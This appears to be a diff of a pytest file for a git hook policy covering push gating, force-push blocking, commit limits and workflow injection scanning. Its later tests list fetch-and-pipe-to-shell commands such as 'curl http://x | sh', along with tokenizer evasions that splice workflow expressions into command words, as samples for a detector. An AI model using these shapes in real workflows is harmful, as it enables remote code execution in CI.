+    git am and the apply-backend rebase share the rebase-apply directory, so a
+    gate that keys on the directory alone calls both "rebase". The remedies are
+    not interchangeable: `git rebase --continue` during an am exits 128 with
+    "It looks like 'git am' is in progress. Cannot rebase.", which is the same
+    dead-end this gate exists to stop printing.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked.txt", "base\n")
+    _git(repo, "checkout", "-q", "-b", "other")
+    _commit_file(repo, "tracked.txt", "other\n")
+    patch_dir = tmp_path / "patches"
+    _git(repo, "format-patch", "-1", "-q", "-o", str(patch_dir))
+    _git(repo, "checkout", "-q", "feature/test")
+    _commit_file(repo, "tracked.txt", "topic\n")
+    patches = sorted(patch_dir.glob("*.patch"))
+    assert patches, "expected format-patch to emit a patch"
+    _git(repo, "am", str(patches[0]), check=False)
+
+    rebase_apply = Path(_git(repo, "rev-parse", "--git-path", "rebase-apply").stdout.strip())
+    if not rebase_apply.is_absolute():
+        rebase_apply = repo / rebase_apply
+    assert (rebase_apply / "applying").exists(), "expected git am to leave its marker"
+
+    assert policy.check_push_refs(io.StringIO(), repo) == 1
+    error = capsys.readouterr().err
+    assert "git am in progress" in error
+    assert "git am --continue" in error
+    assert "git rebase --continue" not in error
+
+
+def test_push_policy_ignores_a_directory_named_like_a_pseudo_ref(tmp_path: Path) -> None:
+    """MERGE_HEAD is a file. A directory at that path is not an open merge."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked.txt", "base\n")
+    merge_head = Path(_git(repo, "rev-parse", "--git-path", "MERGE_HEAD").stdout.strip())
+    if not merge_head.is_absolute():
+        merge_head = repo / merge_head
+    merge_head.mkdir(parents=True)
+
+    assert policy.check_push_refs(io.StringIO(), repo) == 0
+
+
+def test_push_policy_ignores_a_directory_named_like_the_git_am_marker(
+    tmp_path: Path,
+) -> None:
+    """The git-am marker is a file. A directory there is not an open ``git am``.
+
+    ``rebase-apply`` is shared by ``git am`` and the apply-backend rebase, and
+    only the marker inside it tells them apart. Testing the marker with
+    ``exists()`` accepted a directory and reported ``git am`` for a rebase,
+    which hands back ``git am --continue``. That command exits 128 during a
+    rebase, so the wrong-kind marker reintroduces the dead-end remedy this
+    module exists to remove.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "tracked.txt", "base\n")
+    rebase_apply = Path(
+        _git(repo, "rev-parse", "--git-path", "rebase-apply").stdout.strip()
+    )
+    if not rebase_apply.is_absolute():
+        rebase_apply = repo / rebase_apply
+    (rebase_apply / policy.GIT_AM_MARKER).mkdir(parents=True)
+
+    result = policy._active_git_operation(repo)
+
+    assert result is not None
+    operation, remedy = result
+    assert (operation, remedy) != (policy.GIT_AM_OPERATION, policy.GIT_AM_REMEDY)
+    assert operation == "rebase"
 
 
 def test_push_policy_allows_clean_tree_without_active_git_operation(tmp_path: Path) -> None:
@@ -4503,8 +5022,9 @@ def test_push_policy_blocks_main_and_preserves_destination_branch(
 ) -> None:
     repo = tmp_path / "repo"
     _init_repo(repo)
-    head = "1" * 40
-    remote = "2" * 40
+    # Use real commits so the non-fast-forward check can resolve the objects.
+    remote = _commit_file(repo, "tracked", "base\n")
+    head = _commit_file(repo, "tracked", "head\n")
     destinations: list[str | None] = []
 
     def capture_limit(update: policy.PushUpdate, _root: Path) -> int:
@@ -4547,6 +5067,213 @@ def test_new_branch_uses_origin_main_for_policy_bases(tmp_path: Path) -> None:
     assert update.base == base
     assert update.head == head
     assert update.range_spec == f"{base}..{head}"
+
+
+# ---------------------------------------------------------------------------
+# _check_non_fast_forward tests (issue #4293)
+# ---------------------------------------------------------------------------
+
+
+def _make_push_ref(
+    local_sha: str,
+    remote_sha: str,
+    remote_ref: str = "refs/heads/feature/test",
+    local_ref: str = "refs/heads/feature/test",
+) -> policy.PushRef:
+    return policy.PushRef(local_ref, local_sha, remote_ref, remote_sha)
+
+
+def test_non_fast_forward_passes_on_fast_forward_push(tmp_path: Path) -> None:
+    """Fast-forward push: remote_sha is an ancestor of local_sha."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    remote_sha = _commit_file(repo, "f.txt", "v1\n")
+    local_sha = _commit_file(repo, "f.txt", "v2\n")
+    push_ref = _make_push_ref(local_sha, remote_sha)
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 0
+
+
+def test_non_fast_forward_blocks_history_rewrite(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Force push: local_sha does not descend from remote_sha."""
+    monkeypatch.delenv("FORCE_PUSH_OK", raising=False)
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    base = _commit_file(repo, "f.txt", "base\n")
+    # Two divergent branches from base.
+    _git(repo, "checkout", "-q", "-b", "side")
+    side_sha = _commit_file(repo, "f.txt", "side\n")
+    _git(repo, "checkout", "-q", "feature/test")
+    feature_sha = _commit_file(repo, "f.txt", "feature\n")
+    # Push feature as if remote is on side (not an ancestor).
+    push_ref = _make_push_ref(feature_sha, side_sha)
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 1
+    err = capsys.readouterr().err
+    assert "not a fast-forward" in err
+    assert "universal.md" in err
+    assert base  # suppress unused-variable warning
+
+
+def test_non_fast_forward_passes_new_branch(tmp_path: Path) -> None:
+    """New branch: remote_sha is all zeros, nothing to rewrite."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    local_sha = _commit_file(repo, "f.txt", "v1\n")
+    push_ref = _make_push_ref(local_sha, "0" * 40)
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 0
+
+
+def test_non_fast_forward_passes_deletion(tmp_path: Path) -> None:
+    """Branch deletion (local_sha all zeros) is not a force push."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    remote_sha = _commit_file(repo, "f.txt", "v1\n")
+    push_ref = _make_push_ref("0" * 40, remote_sha)
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 0
+
+
+def test_non_fast_forward_returns_2_when_remote_object_absent(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Missing remote object: guard fails closed, not a false positive."""
+    monkeypatch.delenv("FORCE_PUSH_OK", raising=False)
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    local_sha = _commit_file(repo, "f.txt", "v1\n")
+    # A plausible-looking SHA that is not present in the repo.
+    absent_sha = "abcdef1234567890abcdef1234567890abcdef12"
+    push_ref = _make_push_ref(local_sha, absent_sha)
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 2
+    err = capsys.readouterr().err
+    assert "not present in the local object store" in err
+    assert "git fetch" in err
+
+
+def test_non_fast_forward_skips_non_branch_refs(tmp_path: Path) -> None:
+    """Tag refs and other non-branch refs are out of scope.
+
+    The remote_sha and local_sha are on divergent branches (neither is an
+    ancestor of the other), so without the non-branch guard this test would
+    fail.  The guard must fire first and return 0 before the ancestry check.
+    """
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    base = _commit_file(repo, "f.txt", "base\n")
+    # Create two divergent branches from base.
+    _git(repo, "checkout", "-q", "-b", "branch-a")
+    branch_a_sha = _commit_file(repo, "f.txt", "branch-a\n")
+    _git(repo, "checkout", "-q", base)
+    _git(repo, "checkout", "-q", "-b", "branch-b")
+    branch_b_sha = _commit_file(repo, "f.txt", "branch-b\n")
+    # local=branch_b, remote=branch_a: genuinely divergent (non-ancestor).
+    # If the branch guard were absent, this would reach the ancestry check
+    # and return 1.  The guard must fire and return 0 first.
+    push_ref = _make_push_ref(
+        branch_b_sha, branch_a_sha, remote_ref="refs/tags/v1.0.0"
+    )
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 0
+    assert base  # suppress unused-variable warning
+
+
+def test_non_fast_forward_env_var_bypasses_block(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """FORCE_PUSH_OK=1 allows a rewrite with a warning."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    base = _commit_file(repo, "f.txt", "base\n")
+    _git(repo, "checkout", "-q", "-b", "side")
+    side_sha = _commit_file(repo, "f.txt", "side\n")
+    _git(repo, "checkout", "-q", "feature/test")
+    feature_sha = _commit_file(repo, "f.txt", "feature\n")
+    push_ref = _make_push_ref(feature_sha, side_sha)
+    monkeypatch.setenv("FORCE_PUSH_OK", "1")
+
+    result = policy._check_non_fast_forward(push_ref, repo)
+
+    assert result == 0
+    err = capsys.readouterr().err
+    assert "bypassed" in err
+    assert base  # suppress unused-variable warning
+
+
+def test_check_push_refs_blocks_force_push_end_to_end(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """check_push_refs end-to-end: force push is caught."""
+    monkeypatch.delenv("FORCE_PUSH_OK", raising=False)
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    base = _commit_file(repo, "f.txt", "base\n")
+    _git(repo, "checkout", "-q", "-b", "side")
+    side_sha = _commit_file(repo, "f.txt", "side\n")
+    _git(repo, "checkout", "-q", "feature/test")
+    feature_sha = _commit_file(repo, "f.txt", "feature\n")
+    monkeypatch.setattr(policy, "_fetch_origin_main", lambda _repo_root: None)
+    monkeypatch.setattr(policy, "warn_if_push_files_incomplete", lambda *_args: None)
+    stream = io.StringIO(
+        f"refs/heads/feature/test {feature_sha} refs/heads/feature/test {side_sha}\n"
+    )
+
+    result = policy.check_push_refs(stream, repo)
+
+    assert result == 1
+    err = capsys.readouterr().err
+    assert "not a fast-forward" in err
+    assert base  # suppress unused-variable warning
+
+
+def test_check_push_refs_multi_ref_catches_second_rewrite(
+    tmp_path: Path,
+    capsys: pytest.CaptureFixture[str],
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Multiple refs: only the second is a rewrite; the first is a new branch."""
+    monkeypatch.delenv("FORCE_PUSH_OK", raising=False)
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "f.txt", "base\n")
+    _git(repo, "checkout", "-q", "-b", "side")
+    side_sha = _commit_file(repo, "f.txt", "side\n")
+    _git(repo, "checkout", "-q", "feature/test")
+    feature_sha = _commit_file(repo, "f.txt", "feature\n")
+    monkeypatch.setattr(policy, "_fetch_origin_main", lambda _repo_root: None)
+    monkeypatch.setattr(policy, "warn_if_push_files_incomplete", lambda *_args: None)
+    zero = "0" * 40
+    stream = io.StringIO(
+        # First ref: new branch (zero remote), passes.
+        f"refs/heads/new-branch {feature_sha} refs/heads/new-branch {zero}\n"
+        # Second ref: force push, blocked.
+        f"refs/heads/feature/test {feature_sha} refs/heads/feature/test {side_sha}\n"
+    )
+
+    result = policy.check_push_refs(stream, repo)
+
+    assert result == 1
+    assert "not a fast-forward" in capsys.readouterr().err
 
 
 def test_commit_limit_queries_the_destination_branch(
@@ -5072,6 +5799,69 @@ def test_episode_staging_handles_missing_and_symlink(
     assert policy._stage_episode("episode-link", tmp_path) == 2
 
 
+def _stage_files(repo: Path, paths: list[str]) -> None:
+    """Stage new files in repo without committing."""
+    for rel in paths:
+        full = repo / rel
+        full.parent.mkdir(parents=True, exist_ok=True)
+        full.write_bytes(b"content\n")
+        _git(repo, "add", "--", rel)
+
+
+def test_atomic_commit_below_limit(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "README.md", "init\n")
+    _stage_files(repo, ["a.py", "b.py", "c.py"])
+    assert policy.check_atomic_commit(repo) == 0
+
+
+def test_atomic_commit_at_limit(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "README.md", "init\n")
+    _stage_files(repo, ["a.py", "b.py", "c.py", "d.py", "e.py"])
+    assert policy.check_atomic_commit(repo) == 0
+
+
+def test_atomic_commit_above_limit(tmp_path: Path) -> None:
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "README.md", "init\n")
+    _stage_files(repo, ["a.py", "b.py", "c.py", "d.py", "e.py", "f.py"])
+    assert policy.check_atomic_commit(repo) == 1
+
+
+def test_atomic_commit_generated_episode_exempt(tmp_path: Path) -> None:
+    """Five authored files plus a generated episode must not exceed the limit."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "README.md", "init\n")
+    authored = ["a.py", "b.py", "c.py", "d.py", "e.py"]
+    generated = [".agents/memory/episodes/episode-abc123.json"]
+    _stage_files(repo, authored + generated)
+    assert policy.check_atomic_commit(repo) == 0
+
+
+def test_atomic_commit_generated_episode_not_enough_to_hide_violation(tmp_path: Path) -> None:
+    """Six authored files are a violation even if a generated episode is also staged."""
+    repo = tmp_path / "repo"
+    _init_repo(repo)
+    _commit_file(repo, "README.md", "init\n")
+    authored = ["a.py", "b.py", "c.py", "d.py", "e.py", "f.py"]
+    generated = [".agents/memory/episodes/episode-abc123.json"]
+    _stage_files(repo, authored + generated)
+    assert policy.check_atomic_commit(repo) == 1
+
+
+def test_atomic_commit_git_failure_returns_error(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(policy, "_run_git", lambda *_a, **_k: _completed(128))
+    assert policy.check_atomic_commit(tmp_path) == 2
+
+
 def test_push_ref_parser_rejects_option_like_refs() -> None:
     sha = "1" * 40
     with pytest.raises(ValueError, match="invalid ref name"):
@@ -5204,13 +5994,19 @@ def test_commit_limit_relaxes_for_merge_from_main(
             return _completed(0, "30\n")
         if args[:2] == ["rev-list", "--merges"]:
             return _completed(0, "merge-sha\n")
-        if args[:2] == ["rev-list", "--first-parent"]:
-            return _completed(0, "main-parent\nolder-main\n")
         if args[0] == "show" and "--format=%P" in args:
             return _completed(0, "first-parent main-parent\n")
         return _completed(0)
 
     monkeypatch.setattr(policy, "_run_git", fake_git)
+    # main_first_parent_shas is imported into git_hook_policy's namespace; patch
+    # there so _contains_main_merge sees the correct trunk without a real git repo.
+    # The double takes run_git because the hook passes its own hardened runner.
+    monkeypatch.setattr(
+        policy,
+        "main_first_parent_shas",
+        lambda _root, run_git=None: frozenset(["main-parent", "older-main"]),
+    )
 
     assert policy._check_commit_limit(update, tmp_path) == 0
 
@@ -5231,13 +6027,18 @@ def test_commit_limit_holds_when_the_merged_parent_is_off_main_trunk(
             return _completed(0, "30\n")
         if args[:2] == ["rev-list", "--merges"]:
             return _completed(0, "merge-sha\n")
-        if args[:2] == ["rev-list", "--first-parent"]:
-            return _completed(0, "some-other-main-commit\n")
         if args[0] == "show" and "--format=%P" in args:
             return _completed(0, "first-parent landed-parent\n")
         return _completed(0)
 
     monkeypatch.setattr(policy, "_run_git", fake_git)
+    # Trunk contains a different commit; "landed-parent" is not on first-parent
+    # history, so the wider limit must be refused.
+    monkeypatch.setattr(
+        policy,
+        "main_first_parent_shas",
+        lambda _root, run_git=None: frozenset(["some-other-main-commit"]),
+    )
     monkeypatch.setattr(
         policy,
         "_run_command",
@@ -5256,6 +6057,159 @@ def test_main_merge_detection_handles_git_errors(
 
     assert not policy._contains_main_merge(update, tmp_path)
     assert not policy._merge_has_main_parent("merge", tmp_path)
+
+
+def test_needs_split_bypass_allows_small_push_on_large_branch(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """needs-split label + <= 5 new commits bypasses the limit (issue #3895).
+
+    PR #3688 scenario: branch has 52 commits (over limit) but only adds
+    3 new commits in this push to address review feedback. The push must
+    succeed because splitting is already in progress.
+    """
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/fix/big", "a" * 40, "refs/heads/fix/big", "b" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch="fix/big",
+    )
+
+    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
+        if args[:2] == ["rev-list", "--count"] and "^origin/" in " ".join(args):
+            # New commits only: 3
+            return _completed(0, "3\n")
+        if args[:2] == ["rev-list", "--count"]:
+            # Total branch commits: 52
+            return _completed(0, "52\n")
+        return _completed(0)
+
+    call_count = [0]
+
+    def fake_command(
+        args: Sequence[str], _root: Path, **_kwargs: object
+    ) -> subprocess.CompletedProcess[str]:
+        call_count[0] += 1
+        if "--label" in args and "needs-split" in args:
+            return _completed(0, "needs-split present on PR #3688\n")
+        # commit-limit-bypass not present
+        return _completed(1, stdout="no commit-limit-bypass label (PR #3688)\n")
+
+    monkeypatch.setattr(policy, "_run_git", fake_git)
+    monkeypatch.setattr(policy, "_run_command", fake_command)
+
+    assert policy._check_commit_limit(update, tmp_path) == 0
+    assert "needs-split" in capsys.readouterr().out
+
+
+def test_needs_split_bypass_blocks_when_new_commits_exceed_cap(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """needs-split label does NOT bypass when this push is itself large (issue #3895).
+
+    If the author is adding 10 commits to an already-over-limit branch, the
+    needs-split bypass must not apply. Only commit-limit-bypass unlocks this.
+    """
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/fix/big", "a" * 40, "refs/heads/fix/big", "b" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch="fix/big",
+    )
+
+    def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
+        if args[:2] == ["rev-list", "--count"] and "^origin/" in " ".join(args):
+            # New commits: 10 (over the cap of 5)
+            return _completed(0, "10\n")
+        if args[:2] == ["rev-list", "--count"]:
+            return _completed(0, "52\n")
+        return _completed(0)
+
+    def fake_command(
+        args: Sequence[str], _root: Path, **_kwargs: object
+    ) -> subprocess.CompletedProcess[str]:
+        if "--label" in args and "needs-split" in args:
+            return _completed(0, "needs-split present on PR #3688\n")
+        return _completed(1, stdout="no commit-limit-bypass label (PR #3688)\n")
+
+    monkeypatch.setattr(policy, "_run_git", fake_git)
+    monkeypatch.setattr(policy, "_run_command", fake_command)
+
+    assert policy._check_commit_limit(update, tmp_path) == 1
+
+
+def test_needs_split_bypass_absent_falls_through_to_block(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """When neither bypass label is present, the block stands (issue #3895)."""
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/fix/big", "a" * 40, "refs/heads/fix/big", "b" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch="fix/big",
+    )
+    monkeypatch.setattr(policy, "_run_git", lambda *_args: _completed(0, "52\n"))
+    monkeypatch.setattr(
+        policy,
+        "_run_command",
+        lambda *_args, **_kwargs: _completed(1, stdout="no label\n"),
+    )
+
+    assert policy._check_commit_limit(update, tmp_path) == 1
+
+
+def test_needs_split_bypass_allows_push_at_exact_cap(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """needs-split bypass allows exactly _NEEDS_SPLIT_NEW_COMMIT_CAP new commits.
+
+    The boundary: 5 new commits on a 52-commit over-limit branch must succeed.
+    6 new commits must not. This test covers cap=5 exactly so the <= vs < mutation
+    is detected.
+    """
+    update = policy.PushUpdate(
+        source=policy.PushRef("refs/heads/fix/big", "a" * 40, "refs/heads/fix/big", "b" * 40),
+        base="base",
+        head="head",
+        range_spec="base..head",
+        destination_branch="fix/big",
+    )
+
+    def _fake_git_with_new(new_count: int) -> object:
+        def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
+            if args[:2] == ["rev-list", "--count"] and "^origin/" in " ".join(args):
+                return _completed(0, f"{new_count}\n")
+            return _completed(0, "52\n")
+
+        return fake_git
+
+    def fake_command(
+        args: Sequence[str], _root: Path, **_kwargs: object
+    ) -> subprocess.CompletedProcess[str]:
+        if "--label" in args and "needs-split" in args:
+            return _completed(0, "needs-split\n")
+        return _completed(1, stdout="no commit-limit-bypass\n")
+
+    monkeypatch.setattr(policy, "_run_command", fake_command)
+
+    # Exactly at cap (5): must pass
+    monkeypatch.setattr(policy, "_run_git", _fake_git_with_new(policy._NEEDS_SPLIT_NEW_COMMIT_CAP))
+    assert policy._check_commit_limit(update, tmp_path) == 0
+
+    # One over the cap (6): must block
+    monkeypatch.setattr(
+        policy, "_run_git", _fake_git_with_new(policy._NEEDS_SPLIT_NEW_COMMIT_CAP + 1)
+    )
+    assert policy._check_commit_limit(update, tmp_path) == 1
 
 
 def test_main_merge_detection_rejects_non_main_second_parent(
@@ -5460,7 +6414,7 @@ def test_a_merge_is_not_a_merge_of_main_when_there_is_no_origin_main(
     _git(repo, "update-ref", "-d", "refs/remotes/origin/main")
     merge = _merge_into_local(repo, "main")
 
-    assert policy._main_trunk_commits(repo) == frozenset()
+    assert policy.main_first_parent_shas(repo) == frozenset()
     assert policy._merge_has_main_parent(merge, repo) is False
 
 
@@ -5475,21 +6429,25 @@ def test_the_main_trunk_is_read_once_for_one_push(
     keeps the cost flat in the number of merges pushed.
     """
     update = _push_update()
-    trunk_reads: list[Sequence[str]] = []
+    trunk_reads: list[None] = []
+
+    def fake_first_parent_shas(_root: Path, run_git: object = None) -> frozenset[str]:
+        trunk_reads.append(None)
+        return frozenset(["a-main-commit"])
 
     def fake_git(_root: Path, args: Sequence[str]) -> subprocess.CompletedProcess[str]:
         if args[:2] == ["rev-list", "--count"]:
             return _completed(0, "5\n")
         if args[:2] == ["rev-list", "--merges"]:
             return _completed(0, "".join(f"merge-{index}\n" for index in range(25)))
-        if args[:2] == ["rev-list", "--first-parent"]:
-            trunk_reads.append(args)
-            return _completed(0, "a-main-commit\n")
         if args[0] == "show" and "--format=%P" in args:
             return _completed(0, "first-parent a-landed-branch\n")
         return _completed(0)
 
     monkeypatch.setattr(policy, "_run_git", fake_git)
+    # main_first_parent_shas is imported into git_hook_policy's namespace; patch
+    # it there so _contains_main_merge picks up the mock.
+    monkeypatch.setattr(policy, "main_first_parent_shas", fake_first_parent_shas)
 
     assert policy._contains_main_merge(update, tmp_path) is False
     assert len(trunk_reads) == 1
@@ -6250,6 +7208,48 @@ def test_history_integrity_rejects_shallow_or_unknown_state(
     assert policy._check_history_integrity(tmp_path) == expected
 
 
+def test_history_integrity_shallow_message_names_remedy(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """Shallow clone error must name the fix command (issue #4086)."""
+    monkeypatch.setattr(
+        policy,
+        "_run_git",
+        lambda *_args: _completed(0, "true\n"),
+    )
+
+    assert policy._check_history_integrity(tmp_path) == 2
+
+    err = capsys.readouterr().err
+    assert "git fetch --unshallow origin" in err
+
+
+def test_history_integrity_shallow_message_names_pin_sha(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """Shallow message includes the pinning SHA from .git/shallow (issue #4086)."""
+    pin = "a" * 40
+    shallow_file = tmp_path / ".git" / "shallow"
+    shallow_file.parent.mkdir(parents=True, exist_ok=True)
+    shallow_file.write_text(f"{pin}\n", encoding="utf-8")
+
+    monkeypatch.setattr(
+        policy,
+        "_run_git",
+        lambda *_args: _completed(0, "true\n"),
+    )
+
+    assert policy._check_history_integrity(tmp_path) == 2
+
+    err = capsys.readouterr().err
+    assert pin in err
+    assert "git fetch --unshallow origin" in err
+
+
 def test_push_update_defense_blocks_protected_destination(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -6485,6 +7485,7 @@ def test_old_bot_review_does_not_warn(
         ("observations", ["observations.md"], "sync_observations"),
         ("stage-generated", ["mcp"], "stage_generated"),
         ("extract-episodes", ["session.json"], "extract_session_episodes"),
+        ("atomic-commit", [], "check_atomic_commit"),
         ("planning", [], "run_planning_advisory"),
         ("adr-review", ["README.md"], "check_adr_review_policy"),
         ("retrospective", ["README.md"], "check_retrospective_evidence"),
@@ -7194,7 +8195,7 @@ def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> No
     "shell",
     [
         "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
-        "python3 -c 'import subprocess; subprocess.run([\"sh\", \"x\"])'",
+        'python3 -c \'import subprocess; subprocess.run(["sh", "x"])\'',
         "node -e \"require('child_process').execSync('bash x')\"",
         "perl -e 'exec q{zsh}'",
     ],
@@ -7212,7 +8213,7 @@ def test_shells_naming_a_foreign_interpreter_are_not_treated_as_non_bash(shell: 
         "node /usr/local/lib/run {0}",
         "pwsh -File C:\\tools\\run.ps1",
         "pwsh -File '~/x.ps1'",
-        "cmd /C \"call build.bat\"",
+        'cmd /C "call build.bat"',
     ],
 )
 def test_shells_delegating_to_a_script_file_are_not_treated_as_non_bash(shell: str) -> None:
@@ -7365,6 +8366,8 @@ def test_partial_parsing_spans_use_character_indexes_after_multibyte_content(
     assert spans == [(2, 2, len("# ✓✓✓\n"), len(raw.decode("utf-8")))]
     # The byte offset would have overshot by three, proving the conversion ran.
     assert spans[0][2] != prefix_bytes
+
+
 @pytest.mark.parametrize("shell", ["powershell", "pwsh -NoProfile", "python3"])
 def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
     assert policy._is_non_bash_shell(shell) is True
@@ -7696,8 +8699,7 @@ def test_anchor_guard_leaves_ordinary_lines_matching(expected: str, actual: str)
     dropped every step containing a blank line.
     """
     assert (
-        policy._semgrep_line_matches_pattern(expected, actual, allow_expected_suffix=False)
-        is True
+        policy._semgrep_line_matches_pattern(expected, actual, allow_expected_suffix=False) is True
     )
 
 
@@ -7784,12 +8786,12 @@ _ARGUMENT_POSITION_SHAPES = (
     pytest.param('echo "${{ github.event.number }}"', id="quoted-argument"),
     pytest.param("gh pr view ${{ github.event.number }} --json title", id="bare-argument"),
     pytest.param('if [ "${{ inputs.mode }}" = "x" ]; then echo hi; fi', id="test-condition"),
-    pytest.param('curl http://x | sh # ${{ inputs.mode }}', id="trailing-comment"),
+    pytest.param("curl http://x | sh # ${{ inputs.mode }}", id="trailing-comment"),
     pytest.param('printf "%s" "${{ inputs.mode }}" > out.txt', id="redirect-argument"),
     pytest.param("MODE=${{ inputs.mode }} ./run.sh", id="assignment-value"),
     pytest.param("${{ inputs.cmd }} --flag", id="lone-expression"),
     pytest.param('echo "a ${{ inputs.mode }} b" | tee log', id="inside-string-piped"),
-    pytest.param('cat <<EOF\n${{ inputs.mode }}\nEOF', id="heredoc-body"),
+    pytest.param("cat <<EOF\n${{ inputs.mode }}\nEOF", id="heredoc-body"),
     pytest.param("./run.sh --mode=${{ inputs.mode }}", id="flag-value"),
 )
 
@@ -7820,7 +8822,7 @@ def test_shell_sink_promotion_stays_inside_its_own_pipeline() -> None:
 # scan. Sixty-five shapes were probed; these are the twenty-three that defeated
 # the first tokenizer. Refs #3673.
 _TOKENIZER_EVASIONS = (
-    pytest.param("bash <<< \"c${{ inputs.x }}url http://y | sh\"", id="here-string"),
+    pytest.param('bash <<< "c${{ inputs.x }}url http://y | sh"', id="here-string"),
     pytest.param("coproc c${{ inputs.x }}url http://y", id="coproc"),
     pytest.param("builtin c${{ inputs.x }}url http://y", id="builtin-prefix"),
     pytest.param("sudo c${{ inputs.x }}url http://y", id="sudo-prefix"),
@@ -7836,15 +8838,15 @@ _TOKENIZER_EVASIONS = (
         id="case-resume",
     ),
     pytest.param("echo hi > >(c${{ inputs.x }}url http://y)", id="process-substitution-out"),
-    pytest.param("source /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="source-sink"),
-    pytest.param(". /dev/stdin <<< \"c${{ inputs.x }}url http://y\"", id="dot-source-sink"),
+    pytest.param('source /dev/stdin <<< "c${{ inputs.x }}url http://y"', id="source-sink"),
+    pytest.param('. /dev/stdin <<< "c${{ inputs.x }}url http://y"', id="dot-source-sink"),
     pytest.param("echo 'c${{ inputs.x }}url' | python3 -c 'pass'", id="python-inline-sink"),
     pytest.param("echo 'c${{ inputs.x }}url' | perl -e 'system(<>)'", id="perl-inline-sink"),
     pytest.param("echo 'c${{ inputs.x }}url' | node -e 'x'", id="node-inline-sink"),
     pytest.param("echo 'c${{ inputs.x }}url' | awk '{system($0)}'", id="awk-sink"),
-    pytest.param("ssh host \"c${{ inputs.x }}url http://y\"", id="ssh-sink"),
+    pytest.param('ssh host "c${{ inputs.x }}url http://y"', id="ssh-sink"),
     pytest.param("find . -exec c${{ inputs.x }}url http://y \\;", id="find-exec-sink"),
-    pytest.param("script -qc \"c${{ inputs.x }}url http://y\" /dev/null", id="script-sink"),
+    pytest.param('script -qc "c${{ inputs.x }}url http://y" /dev/null', id="script-sink"),
     pytest.param("echo 'c${{ inputs.x }}url' | ruby -e 'x'", id="ruby-inline-sink"),
     pytest.param(
         "echo 'c${{ inputs.x }}url http://y' | while read l; do eval \"$l\"; done",
@@ -7887,12 +8889,18 @@ def test_script_interpreters_are_sinks_only_with_an_inline_code_flag() -> None:
     ``python3 build.py --tag "v${{ inputs.version }}"``, a shape that appears in
     real workflows.
     """
-    assert policy._splices_expression_into_command_word(
-        'python3 build.py --tag "v${{ inputs.version }}"'
-    ) is False
-    assert policy._splices_expression_into_command_word(
-        "echo 'c${{ inputs.x }}url' | python3 -c 'pass'"
-    ) is True
+    assert (
+        policy._splices_expression_into_command_word(
+            'python3 build.py --tag "v${{ inputs.version }}"'
+        )
+        is False
+    )
+    assert (
+        policy._splices_expression_into_command_word(
+            "echo 'c${{ inputs.x }}url' | python3 -c 'pass'"
+        )
+        is True
+    )
 
 
 def test_tainted_variable_must_be_the_whole_command_word() -> None:
@@ -7902,10 +8910,13 @@ def test_tainted_variable_must_be_the_whole_command_word() -> None:
